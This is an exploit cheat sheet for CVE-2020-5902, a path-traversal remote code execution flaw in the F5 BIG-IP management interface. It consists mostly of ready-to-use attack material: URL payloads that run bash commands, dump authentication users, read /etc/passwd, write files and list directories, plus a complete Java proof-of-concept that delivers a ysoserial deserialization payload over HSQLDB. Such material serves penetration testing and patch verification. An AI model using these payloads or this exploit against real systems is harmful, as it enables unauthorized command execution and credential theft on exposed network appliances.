# CVE-2020-5902
## RCE
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/WWWWW&content=id
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/WWWWW

## ysoserial
```
/*
 Exploit Title: F5 BIG-IP Remote Code Execution
 Date: 2020-07-06
 Authors: Charles Dardaman of Critical Start, TeamARES
                  Rich Mirch of Critical Start, TeamARES
 CVE: CVE-2020-5902

 Requirements:
   Java JDK
   hsqldb.jar 1.8
   ysoserial https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
*/

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.io.IOException;
import org.hsqldb.lib.StringConverter;

public class f5RCE {

	public static void main(String[] args) {
		Connection connection;
		Statement statement;

		if(args.length != 2) {
			System.err.println("\nUsage: <hostname> <payload.txt>\n");
			System.exit(1);
		}
		String server = args[0];
		String pfile = args[1];
		String payload = null;

		try {
			payload = new String(Files.readAllBytes(Paths.get(pfile)));
			payload = payload.replaceAll("(\\n|\\r)","");
		} catch (IOException e) {
			e.printStackTrace();
		}

		String dburl = "jdbc:hsqldb:https://" + server +
                               ":443/tmui/login.jsp/..%3b/hsqldb/";

		System.out.println("Connecting to " + server);
		try {
			Class.forName("org.hsqldb.jdbcDriver");
			connection = DriverManager.getConnection(dburl, "sa","");
			statement = connection.createStatement();
			statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
			statement.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload +"');");
		} catch (java.sql.SQLException sqle) {
			// ignore java.sql.SQLException: S1000
			// General error java.lang.IllegalArgumentException: argument type mismatch
			if(sqle.getSQLState().equals("S1000") && sqle.getErrorCode() == 40) {
				System.out.println("Payload executed");
			} else {
				System.out.println("Unexpected SQL error");
				sqle.printStackTrace();
			}
			return;
		}
		catch (ClassNotFoundException cne) {
			System.err.println("Error loading db driver");
			cne.printStackTrace();
			return;
		}
	}
}

```

## Read password
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user

## Read file
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd

## Write file
/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/WWWWW&content=id

## List file
/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/

## Orange Tsai-Breaking-Parser-Logic
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
